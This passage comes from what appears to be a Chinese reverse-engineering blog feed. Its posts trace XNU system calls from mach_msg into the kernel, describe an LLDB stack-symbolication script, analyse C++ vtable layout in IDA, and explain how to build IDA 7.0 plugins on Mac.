 %rsp, %rbp    0x7fff79299698 &lt;+4&gt;: pushq  %r15    0x7fff7929969a &lt;+6&gt;: pushq  %r14Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>调试可以看出mach_msg实现在libsystem_kernel.dylib之中</p><pre><code class="assembly">(lldb) dislibsystem_kernel.dylib`mach_msg:-&gt;  0x7fff79299694 &lt;+0&gt;:   pushq  %rbp    0x7fff79299695 &lt;+1&gt;:   movq   %rsp, %rbp    0x7fff79299698 &lt;+4&gt;:   pushq  %r15    0x7fff7929969a &lt;+6&gt;:   pushq  %r14    0x7fff7929969c &lt;+8&gt;:   pushq  %r13    0x7fff7929969e &lt;+10&gt;:  pushq  %r12    0x7fff792996a0 &lt;+12&gt;:  pushq  %rbx    0x7fff792996a1 &lt;+13&gt;:  subq   $0x28, %rsp    0x7fff792996a5 &lt;+17&gt;:  movl   %ecx, %r13d    0x7fff792996a8 &lt;+20&gt;:  movl   %esi, %ebx    0x7fff792996aa &lt;+22&gt;:  movq   %rdi, %r14    0x7fff792996ad &lt;+25&gt;:  movl   0x10(%rbp), %eax    0x7fff792996b0 &lt;+28&gt;:  movl   %ebx, %r12d    0x7fff792996b3 &lt;+31&gt;:  andl   $0xfffffbbf, %r12d        ; imm = 0xFFFFFBBF     0x7fff792996ba &lt;+38&gt;:  movl   %eax, (%rsp)    0x7fff792996bd &lt;+41&gt;:  movl   %r12d, %esi    0x7fff792996c0 &lt;+44&gt;:  movl   %edx, %r15d    0x7fff792996c3 &lt;+47&gt;:  movl   %r8d, -0x2c(%rbp)    0x7fff792996c7 &lt;+51&gt;:  movl   %r9d, -0x30(%rbp)    0x7fff792996cb &lt;+55&gt;:  callq  0x7fff79299170            ; mach_msg_trap    ...</code></pre><pre><code class="c">mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify){  mach_msg_return_t result; // eax  mach_msg_option_t v8; // er12  result = mach_msg_trap();  if ( !result )    return 0;  if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 )  {    do      result = mach_msg_trap();    while ( result == 268435463 );  }  v8 = option;  if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 )  {    do      result = mach_msg_trap();    while ( result == 268451845 );  }  return result;}</code></pre><p>通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下</p><pre><code class="assembly">* thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1    frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_traplibsystem_kernel.dylib`mach_msg_trap:-&gt;  0x7fff79299170 &lt;+0&gt;:  movq   %rcx, %r10    0x7fff79299173 &lt;+3&gt;:  movl   $0x100001f, %eax          ; imm = 0x100001F     0x7fff79299178 &lt;+8&gt;:  syscall     0x7fff7929917a &lt;+10&gt;: retq   Target 0: (CVE-2019-6231-poc) stopped.</code></pre><p>这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。</p><h4 id="XNU内核系统调用流程"><a href="#XNU内核系统调用流程" class="headerlink" title="XNU内核系统调用流程"></a>XNU内核系统调用流程</h4><p>系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过<a href="http://www.intel.com/content/www/us/en/processors/architectures-software-developer-manuals.html" target="_blank" rel="external">intel官方文档</a>可以找到</p><pre><code>SYSCALL invokes an OS system-call handler at privilege level 0.It does so by loading RIP from the IA32_LSTAR MSR</code></pre><p>也就是内核需要将系统调用处理函数入口放到<code>IA32_LSTAR</code> <a href="https://en.wikipedia.org/wiki/Model-specific_register" target="_blank" rel="external">model specific register</a>. 在内核源码中对应在<code>osfmk/i386/mp_desc.c</code>的<code>cpu_syscall_init(cpu_data_t *cdp)</code>函数之中</p><pre><code class="c">/* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */voidcpu_syscall_init(cpu_data_t *cdp){#if MONOTONIC    mt_cpu_up(cdp);#else /* MONOTONIC */#pragma unused(cdp)#endif /* !MONOTONIC */    wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS);     wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter));    wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku);    /* Enable syscall/sysret */    wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE);    /*     * MSRs for 64-bit syscall/sysret     * Note USER_CS because sysret uses this + 16 when returning to     * 64-bit code.     */    wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));    wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32));    /*     * Emulate eflags cleared by sysenter but note that     * we also clear the trace trap to avoid the complications     * of single-stepping into a syscall. The nested task bit     * is also cleared to avoid a spurious &quot;task switch&quot;     * should we choose to return via an IRET.     */    wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT);}</code></pre><p><code>wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));</code>也就是系统调用会由<code>hi64_syscall</code>函数处理。这个函数实现在<code>xnu/osfmk/x86_64/idt64.s</code>之中</p><pre><code class="assembly">Entry(hi64_syscall)Entry(idt64_syscall)    swapgs     /* Use RAX as a temporary by shifting its contents into R11[32:63]      * The systemcall number is defined to be a 32-bit quantity, as is      * RFLAGS.      */    shlq    $32, %rax    or     %rax, %r11.globl EXT(dblsyscall_patch_point)EXT(dblsyscall_patch_point)://    movabsq    $0x12345678ABCDEFFFULL, %rax     /* Generate offset to the double-mapped per-CPU data shadow      * into RAX      */    leaq    EXT(idt64_hndl_table0)(%rip), %rax    mov    16(%rax), %rax    mov     %rsp, %gs:CPU_UBER_TMP(%rax)  /* save user stack */    mov     %gs:CPU_ESTACK(%rax), %rsp  /* switch stack to per-cpu estack */    sub    $(ISF64_SIZE), %rsp    /*     * Synthesize an ISF frame on the exception stack     */    movl    $(USER_DS), ISF64_SS(%rsp)    mov    %rcx, ISF64_RIP(%rsp)        /* rip */    mov    %gs:CPU_UBER_TMP(%rax), %rcx    mov    %rcx, ISF64_RSP(%rsp)        /* user stack --changed */    mov    %r11, %rax    shrq    $32, %rax        /* Restore RAX */    mov    %r11d, %r11d        /* Clear r11[32:63] */    mov    %r11, ISF64_RFLAGS(%rsp)    /* rflags */    movl    $(SYSCALL_CS), ISF64_CS(%rsp)    /* cs - a pseudo-segment */    mov    %rax, ISF64_ERR(%rsp)        /* err/rax - syscall code */    movq    $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp)    movq    $(T_SYSCALL), ISF64_TRAPNO(%rsp)    /* trapno */    swapgs    jmp    L_dispatch            /* this can only be 64-bit */</code></pre><p>继续跟下去，会得到如下执行流程</p><pre><code>syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt;L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall</code></pre><pre><code class="assembly">/* * 64bit Tasks * System call entries via syscall only: * *    r15     x86_saved_state64_t *    rsp     kernel stack * *    both rsp and r15 are 16-byte aligned *    interrupts disabled *    direction flag cleared */Entry(hndl_syscall)    TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movl    $-1, TH_IOTIER_OVERRIDE(%rcx)    /* Reset IO tier override to -1 before handling syscall */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    /*     * We can be here either for a mach, unix machdep or diag syscall,     * as indicated by the syscall class:     */    movl    R64_RAX(%r15), %eax        /* syscall number/class */    movl    %eax, %edx    andl    $(SYSCALL_CLASS_MASK), %edx    /* syscall class */    cmpl    $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mach_scall64)    cmpl    $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_unix_scall64)    cmpl    $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_mdep_scall64)    cmpl    $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx    je    EXT(hndl_diag_scall64)    /* Syscall class unknown */    sti    CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1)    /* no return */</code></pre><p><code>hndl_syscall</code>这个函数会系统调用分为<code>hndl_unix_scall64</code> 、<code>hndl_mach_scall64</code>、<code>hndl_mdep_scall64</code>、<code>hndl_diag_scall64</code>四类分别处理</p><p>这里以<code>hndl_unix_scall64</code>为列</p><pre><code class="assembly">Entry(hndl_unix_scall)        TIME_TRAP_UENTRY    movq    %gs:CPU_ACTIVE_THREAD,%rcx    /* get current thread     */    movq    TH_TASK(%rcx),%rbx        /* point to current task  */    incl    TH_SYSCALLS_UNIX(%rcx)        /* increment call count   */    /* Check for active vtimers in the current task */    TASK_VTIMER_CHECK(%rbx,%rcx)    sti    CCALL1(unix_syscall, %r15)    /*     * always returns through thread_exception_return     */</code></pre><p>这里调动了<code>unix_syscall</code>函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查</p><p>以及根据系统调用表去调用对应的实现</p><pre><code class="c">  thread = current_thread();  uthread = get_bsdthread_info(thread);  // regs is derrived from r15 ...  code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK;  callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code];  // ...  vt = (void *)uthread-&gt;uu_arg;  // ...  memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi,        args_in_regs * sizeof(syscall_arg_t));  // ...  error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0]));</code></pre><p>目前执行的流程如下</p><pre><code>hi64_syscallL_dispatch_U64L_dispatch_64bitL_common_dispatchhndl_syscall // rdx, pushed in hi64_syscallhndl_unix_scall64unix_syscall64error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there</code></pre><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://www.binss.me/blog/interrupt-and-exception/" target="_blank" rel="external">https://www.binss.me/blog/interrupt-and-exception/</a></p><p><a href="https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html" target="_blank" rel="external">https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html</a></p><p><a href="https://gist.github.com/yrp604/23e86dce9ca12bf514ef" target="_blank" rel="external">https://gist.github.com/yrp604/23e86dce9ca12bf514ef</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;XNU系统调用深度解析&quot;&gt;&lt;a href=&quot;#XNU系统调用深度解析&quot; class=&quot;headerlink&quot; title=&quot;XNU系统调用深度解析&quot;&gt;&lt;/a&gt;XNU系统调用深度解析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;从一个函数分析到系统调用的内核实现&lt;/p&gt;
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="XNU" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"/>
    
      <category term="Kernel" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"/>
    
  </entry>
  
  <entry>
    <title>LLDB调试器栈符号化</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB%E8%B0%83%E8%AF%95%E5%99%A8%E6%A0%88%E7%AC%A6%E5%8F%B7%E5%8C%96/%E5%BC%BA%E5%8C%96%E4%BD%A0%E7%9A%84lldb%E8%B0%83%E8%AF%95%E5%99%A8/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2018/10/03/LLDB调试器栈符号化/强化你的lldb调试器/</id>
    <published>2018-10-03T05:27:59.000Z</published>
    <updated>2019-02-21T10:07:17.274Z</updated>
    
    <content type="html"><![CDATA[<h3 id="强化你的lldb调试器"><a href="#强化你的lldb调试器" class="headerlink" title="强化你的lldb调试器"></a>强化你的lldb调试器</h3><h3 id="Why"><a href="#Why" class="headerlink" title="Why?"></a>Why?</h3><p>lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。</p><h3 id="How"><a href="#How" class="headerlink" title="How?"></a>How?</h3><p>但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。</p><p>正好lldb提供了python的接口，可以开发自定义的命令。</p><h3 id="And-what"><a href="#And-what" class="headerlink" title="And what ?"></a>And what ?</h3><p>虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在<a href="https://github.com/4ch12dy/xia0LLDB">这里</a></p><p>这里面还有的搜索算法以及异常处理还需要优化，以及对于block这类函数还不能恢复，不过对于大多数的场景目前还是可用。具体效果可以如下：</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_bt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_bt.jpg?raw=true"></p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/b_sbt.jpg?raw=true" alt="https://github.com/4ch12dy/xia0LLDB/blob/master/resource/b_sbt.jpg?raw=true"></p><h3 id="update"><a href="#update" class="headerlink" title="update"></a>update</h3><p>现已支持恢复block结构符号解析，通过提供的ida脚本，得到一个json格式的block符号文件，然后在lldb命令行中输入<code>sbt -f block-json-file-path</code>即可加载该文件。效果如下：</p><h4 id="原始的bt命令结果"><a href="#原始的bt命令结果" class="headerlink" title="原始的bt命令结果"></a>原始的bt命令结果</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/orig_bt.png?raw=true" alt="orig_bt"></p><h4 id="sbt命令（没有加载block符号文件）"><a href="#sbt命令（没有加载block符号文件）" class="headerlink" title="sbt命令（没有加载block符号文件）"></a>sbt命令（没有加载block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-noblockfile.png?raw=true" alt="sbt-noblockfile"></p><h4 id="sbt命令（带有block符号文件）"><a href="#sbt命令（带有block符号文件）" class="headerlink" title="sbt命令（带有block符号文件）"></a>sbt命令（带有block符号文件）</h4><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/lldb-python/sbt-blockfile.png?raw=true" alt="sbt-blockfile"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;强化你的lldb调试器&quot;&gt;&lt;a href=&quot;#强化你的lldb调试器&quot; class=&quot;headerlink&quot; title=&quot;强化你的lldb调试器&quot;&gt;&lt;/a&gt;强化你的lldb调试器&lt;/h3&gt;&lt;h3 id=&quot;Why&quot;&gt;&lt;a href=&quot;#Why&quot; class=&quot;he
      
    
    </summary>
    
      <category term="iOSRE" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/iOSRE/"/>
    
    
      <category term="LLDB" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/LLDB/"/>
    
      <category term="python" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; Rectangle::getArea(void)</code></pre><p>就是_DATA段中的数据结构，现在我们可以清晰的理解C++类在内存的数据结构了。</p><h3 id="一点理解"><a href="#一点理解" class="headerlink" title="一点理解"></a>一点理解</h3><p>C++这个语言特性非常多，如果不能理解其本质很容易造成bug。这里想把C++和OC做一个简单的对比，C++的很多实现都是在编译时就确定的，C++中的类我更愿意理解成为C中的结构体。而OC这语言，大多都是在运行时才能确定，方法转化为消息处理。在可执行文件中也有专门的段存储其复杂的类数据结构，也因为这样，OC在运行时可以做很多hack操作，比如hook其方法实现等等。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;C-类结构以及vtable分析&quot;&gt;&lt;a href=&quot;#C-类结构以及vtable分析&quot; class=&quot;headerlink&quot; title=&quot;C++类结构以及vtable分析&quot;&gt;&lt;/a&gt;C++类结构以及vtable分析&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;通过实
      
    
    </summary>
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/C/"/>
    
    
      <category term="C++" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>IDA7.0 Mac 插件编译指南v1</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/11/30/IDA-Mac-插件编写指南/IDA-Mac-插件编写指南/</id>
    <published>2017-11-30T06:25:09.000Z</published>
    <updated>2019-02-21T09:59:22.403Z</updated>
    
    <content type="html"><![CDATA[<h3 id="先说两句"><a href="#先说两句" class="headerlink" title="先说两句"></a>先说两句</h3><p>前不久IDA7.0发布，这次相较之前来说有很多的改动，首先整个IDA是x86 64位架构，而之前却一直是i386 32位，因此插件同样为64位的dylib。不仅这样，SDK上某些接口也发生了改变，导致很多优秀的插件不得不重新改动源码，很多在IDA7上编译也存在问题。下面我将以IDA的官方插件findcrypt2来说明IDA7的插件编译细节。编译IDA插件是个麻烦事，主要在于网上相关的资料很少，唯一的几篇也是年代久远，Makefile里面很多编译参数都有变化，目前来说，没有一个完整的文章来介绍如何在Mac平台下编译IDA插件的指南。希望这边文章能够对有这需求的人有所帮助。</p><h3 id="搭建xcode环境"><a href="#搭建xcode环境" class="headerlink" title="搭建xcode环境"></a>搭建xcode环境</h3><p>在Mac上完全可以用xcode来帮助我们编译IDA插件，其实更常见的是用Makefile编译，但原理一样，所以这里就以xcode来介绍。</p><p>我们知道IDA的插件的文件格式为dylib动态库，因此在创建xcode项目时在Framework&amp;Libarry中选择Libarry</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_1.jpg?raw=true" alt="xcode_step_1"></p><p>然后再选择为Dynamic动态库，并导入C++标准库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/xcode_step_2.jpg?raw=true" alt="xcode_step_2"></p><p>接下来项目中自动会生成两个文件。暂时不用管，我们把findcrypt2的源码放入该项目，最后如下图所示</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/project_1.jpg?raw=true" alt="project_1"></p><p>这时你的项目中像ida.hpp这类的头文件肯定会提示找不到，还需要进一步设置。</p><h3 id="Build-setting"><a href="#Build-setting" class="headerlink" title="Build setting"></a>Build setting</h3><p>这里我们将设置头文件和库的搜索路径等等。</p><p>首先设置目标架构为x86_64</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/arch_s.jpg?raw=true" alt="arch_s"></p><p>然后设置头文件和库的搜索路径，依据你IDA及sdk路径改成对应路径</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/search_s.jpg?raw=true" alt="search_s"></p><p>经过上面的设置，此时xcode应该能找到头文件了，这时还需要设置连接的静态库</p><p><img src="https://github.com/4ch12dy/4ch12dy.github.io/blob/master/articlePic/IDA-Mac-%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%E6%8C%87%E5%8D%97/link_s.jpg?raw=true" 